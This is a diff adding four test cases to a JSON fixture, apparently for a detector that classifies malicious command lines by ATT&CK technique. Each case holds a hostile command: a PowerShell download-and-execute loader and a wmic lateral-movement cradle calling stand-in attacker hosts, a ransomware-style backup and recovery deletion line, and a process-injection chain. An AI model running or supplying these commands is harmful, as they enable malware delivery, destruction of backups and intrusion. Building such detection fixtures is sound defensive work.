@@ -166,5 +166,53 @@
       "techniques": ["T1560"]
     },
     "reject": {"classes": ["impact", "credential_theft", "dropper"]}
+  },
+  {
+    "id": "lumma-stealer-clickfix-iex",
+    "description": "Lumma Stealer ClickFix delivery: mshta downloads PS1 then IEX loads stealer via Net.WebClient",
+    "source": "ProofPoint ClickFix analysis 2024 https://www.proofpoint.com/us/blog/threat-insight/clipboard-hijacking",
+    "command": "mshta \"javascript:close();new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -w 1 -c \\\"$u=\\\"hxxps://cdn.lumma-cdn[.]xyz/build.ps1\\\";iex((New-Object Net.WebClient).DownloadString($u))\\\"',0,1);\"",
+    "expect": {
+      "classes": ["loader", "dropper", "defense_evasion"],
+      "min_confidence": {"loader": "high", "dropper": "high"},
+      "techniques": ["T1218.005", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "black-basta-vss-disable",
+    "description": "Black Basta ransomware pre-encryption: vssadmin + bcdedit backup/recovery disable",
+    "source": "CISA AA24-131A Black Basta",
+    "command": "cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No & wbadmin delete catalog -quiet & sdelete -p 3 -s -q C:\\Windows\\Temp\\*.dmp",
+    "expect": {
+      "classes": ["impact"],
+      "min_confidence": {"impact": "high"},
+      "techniques": ["T1490", "T1485"]
+    },
+    "reject": {"classes": ["dropper", "credential_theft"]}
+  },
+  {
+    "id": "lazarus-wmic-process-create",
+    "description": "Lazarus Group lateral movement via wmic process call create on remote host",
+    "source": "MITRE ATT&CK G0032 ; CISA AA20-239A",
+    "command": "wmic /node:\"10.10.1.25\" /user:\"CORP\\svc_deploy\" /password:\"P@ssw0rd123\" process call create \"powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('hxxp://c2.evil[.]xyz/a'))\"",
+    "expect": {
+      "classes": ["lateral_movement", "dropper", "defense_evasion"],
+      "min_confidence": {"lateral_movement": "high", "dropper": "high"},
+      "techniques": ["T1047", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "fin8-process-injection-va-wpm",
+    "description": "FIN8 process injection: VirtualAllocEx + WriteProcessMemory shellcode injection chain",
+    "source": "MITRE ATT&CK G0061 ; Symantec FIN8 report 2021",
+    "command": "powershell -c \"$h=OpenProcess(0x1F0FFF,0,$pid); $a=VirtualAllocEx($h,0,4096,0x3000,0x40); WriteProcessMemory($h,$a,$sc,4096,0); CreateRemoteThread($h,0,0,$a,0,0,0)\"",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "high"},
+      "techniques": ["T1055.002", "T1055"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
   }
 ]
